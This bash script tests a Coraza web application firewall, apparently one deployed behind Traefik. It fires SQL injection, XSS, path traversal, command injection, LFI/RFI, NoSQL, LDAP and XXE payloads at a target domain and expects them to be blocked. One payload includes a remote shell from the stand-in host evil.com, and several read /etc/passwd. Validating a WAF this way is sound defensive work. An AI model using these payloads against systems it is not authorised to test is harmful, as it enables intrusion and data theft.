#!/bin/bash
#
# Coraza WAF Security Testing Script
# Tests various attack vectors to validate WAF protection
#

set -e

# Configuration
DOMAIN="${1:-afroforgelabs.com}"
PROTOCOL="${2:-https}"
BASE_URL="${PROTOCOL}://${DOMAIN}"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Test counters
PASSED=0
FAILED=0
TOTAL=0

echo -e "${BLUE}=====================================${NC}"
echo -e "${BLUE}   Coraza WAF Security Test Suite   ${NC}"
echo -e "${BLUE}=====================================${NC}"
echo -e "Target: ${BASE_URL}\n"

# Function to test URL
test_url() {
    local test_name="$1"
    local url="$2"
    local expected_status="$3"
    local description="$4"

    TOTAL=$((TOTAL + 1))
    echo -e "${YELLOW}Test ${TOTAL}:${NC} ${test_name}"
    echo -e "  Description: ${description}"
    echo -e "  Testing: ${url}"

    # Make request and capture status code
    http_status=$(curl -k -s -o /dev/null -w "%{http_code}" --max-time 10 "${url}" 2>/dev/null || echo "000")

    # Check if status matches expected
    if [ "${http_status}" = "${expected_status}" ]; then
        echo -e "  ${GREEN}✓ PASSED${NC} (Status: ${http_status})"
        PASSED=$((PASSED + 1))
    else
        echo -e "  ${RED}✗ FAILED${NC} (Expected: ${expected_status}, Got: ${http_status})"
        FAILED=$((FAILED + 1))
    fi
    echo ""
}

# Test 1: Legitimate request (should pass)
echo -e "${BLUE}--- Baseline Tests ---${NC}\n"
test_url \
    "Legitimate Request" \
    "${BASE_URL}/" \
    "200" \
    "Normal HTTP GET request should be allowed"

test_url \
    "Legitimate Request with Query" \
    "${BASE_URL}/?page=home" \
    "200" \
    "Normal request with safe query parameter"

# Test 2: SQL Injection attacks (should block)
echo -e "${BLUE}--- SQL Injection Tests ---${NC}\n"
test_url \
    "SQL Injection - Classic OR" \
    "${BASE_URL}/?id=1' OR '1'='1" \
    "403" \
    "Classic SQL injection with OR statement"

test_url \
    "SQL Injection - UNION" \
    "${BASE_URL}/?id=1 UNION SELECT NULL,NULL,NULL--" \
    "403" \
    "SQL injection using UNION statement"

test_url \
    "SQL Injection - Comment" \
    "${BASE_URL}/?username=admin'--" \
    "403" \
    "SQL injection with SQL comment"

test_url \
    "SQL Injection - Boolean Based" \
    "${BASE_URL}/?id=1 AND 1=1" \
    "403" \
    "Boolean-based SQL injection"

# Test 3: XSS attacks (should block)
echo -e "${BLUE}--- Cross-Site Scripting (XSS) Tests ---${NC}\n"
test_url \
    "XSS - Script Tag" \
    "${BASE_URL}/?search=<script>alert('xss')</script>" \
    "403" \
    "XSS with script tag"

test_url \
    "XSS - Event Handler" \
    "${BASE_URL}/?name=<img src=x onerror=alert(1)>" \
    "403" \
    "XSS with event handler"

test_url \
    "XSS - JavaScript Protocol" \
    "${BASE_URL}/?url=javascript:alert(1)" \
    "403" \
    "XSS using javascript: protocol"

# Test 4: Path Traversal (should block)
echo -e "${BLUE}--- Path Traversal Tests ---${NC}\n"
test_url \
    "Path Traversal - Basic" \
    "${BASE_URL}/../../../etc/passwd" \
    "403" \
    "Basic path traversal attempt"

test_url \
    "Path Traversal - Encoded" \
    "${BASE_URL}/%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd" \
    "403" \
    "URL-encoded path traversal"

test_url \
    "Path Traversal - Windows" \
    "${BASE_URL}/..\\..\\..\\windows\\system32\\config\\sam" \
    "403" \
    "Windows path traversal attempt"

# Test 5: Remote Code Execution (should block)
echo -e "${BLUE}--- Remote Code Execution Tests ---${NC}\n"
test_url \
    "RCE - System Command" \
    "${BASE_URL}/?cmd=cat /etc/passwd" \
    "403" \
    "Remote command execution attempt"

test_url \
    "RCE - PHP Code Injection" \
    "${BASE_URL}/?page=php://input" \
    "403" \
    "PHP wrapper exploitation"

test_url \
    "RCE - Shell Command" \
    "${BASE_URL}/?exec=ls -la" \
    "403" \
    "Shell command injection"

# Test 6: Local File Inclusion (should block)
echo -e "${BLUE}--- Local File Inclusion Tests ---${NC}\n"
test_url \
    "LFI - /etc/passwd" \
    "${BASE_URL}/?file=/etc/passwd" \
    "403" \
    "Attempt to include /etc/passwd"

test_url \
    "LFI - PHP Wrapper" \
    "${BASE_URL}/?page=php://filter/convert.base64-encode/resource=index" \
    "403" \
    "PHP filter wrapper exploitation"

# Test 7: Remote File Inclusion (should block)
echo -e "${BLUE}--- Remote File Inclusion Tests ---${NC}\n"
test_url \
    "RFI - External URL" \
    "${BASE_URL}/?page=http://evil.com/shell.txt" \
    "403" \
    "Remote file inclusion from external URL"

# Test 8: Protocol Attacks (should block)
echo -e "${BLUE}--- Protocol Violation Tests ---${NC}\n"

# Note: These tests require specific HTTP methods
echo -e "${YELLOW}Test:${NC} Invalid HTTP Method"
echo -e "  Description: Testing invalid HTTP method"
http_status=$(curl -k -s -o /dev/null -w "%{http_code}" --max-time 10 -X TRACE "${BASE_URL}/" 2>/dev/null || echo "000")
TOTAL=$((TOTAL + 1))
if [ "${http_status}" = "403" ] || [ "${http_status}" = "405" ]; then
    echo -e "  ${GREEN}✓ PASSED${NC} (Status: ${http_status})"
    PASSED=$((PASSED + 1))
else
    echo -e "  ${RED}✗ FAILED${NC} (Expected: 403 or 405, Got: ${http_status})"
    FAILED=$((FAILED + 1))
fi
echo ""

# Test 9: Scanner Detection (should block)
echo -e "${BLUE}--- Scanner Detection Tests ---${NC}\n"

echo -e "${YELLOW}Test:${NC} Malicious User-Agent"
echo -e "  Description: Request with known scanner user-agent"
http_status=$(curl -k -s -o /dev/null -w "%{http_code}" --max-time 10 -A "sqlmap/1.0" "${BASE_URL}/" 2>/dev/null || echo "000")
TOTAL=$((TOTAL + 1))
if [ "${http_status}" = "403" ]; then
    echo -e "  ${GREEN}✓ PASSED${NC} (Status: ${http_status})"
    PASSED=$((PASSED + 1))
else
    echo -e "  ${RED}✗ FAILED${NC} (Expected: 403, Got: ${http_status})"
    FAILED=$((FAILED + 1))
fi
echo ""

# Test 10: Session Fixation (should block)
echo -e "${BLUE}--- Session Security Tests ---${NC}\n"
test_url \
    "Session Fixation" \
    "${BASE_URL}/?PHPSESSID=malicious123" \
    "403" \
    "Session fixation attempt"

# Test 11: Additional Attack Vectors
echo -e "${BLUE}--- Additional Attack Tests ---${NC}\n"

test_url \
    "NoSQL Injection" \
    "${BASE_URL}/?user[$ne]=null&pass[$ne]=null" \
    "403" \
    "NoSQL injection attempt"

test_url \
    "LDAP Injection" \
    "${BASE_URL}/?user=*)(uid=*))(|(uid=*" \
    "403" \
    "LDAP injection attempt"

test_url \
    "XML Injection" \
    "${BASE_URL}/?xml=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><foo>&xxe;</foo>" \
    "403" \
    "XXE (XML External Entity) attack"

# Display Summary
echo -e "${BLUE}=====================================${NC}"
echo -e "${BLUE}         Test Summary                ${NC}"
echo -e "${BLUE}=====================================${NC}"
echo -e "Total Tests:   ${TOTAL}"
echo -e "${GREEN}Passed:        ${PASSED}${NC}"
echo -e "${RED}Failed:        ${FAILED}${NC}"

# Calculate success rate
if [ ${TOTAL} -gt 0 ]; then
    SUCCESS_RATE=$(( (PASSED * 100) / TOTAL ))
    echo -e "Success Rate:  ${SUCCESS_RATE}%"
fi

echo -e "${BLUE}=====================================${NC}\n"

# Exit status
if [ ${FAILED} -eq 0 ]; then
    echo -e "${GREEN}All tests passed! WAF is working correctly.${NC}"
    exit 0
else
    echo -e "${RED}Some tests failed. Please review WAF configuration.${NC}"
    echo -e "\nTroubleshooting steps:"
    echo -e "1. Check Traefik logs: docker service logs traefik_traefik"
    echo -e "2. Verify WAF middleware is loaded: curl http://edge-node:8080/api/http/middlewares"
    echo -e "3. Review configuration: cat /opt/docker/stacks/traefik/data/configurations/waf.yml"
    exit 1
fi
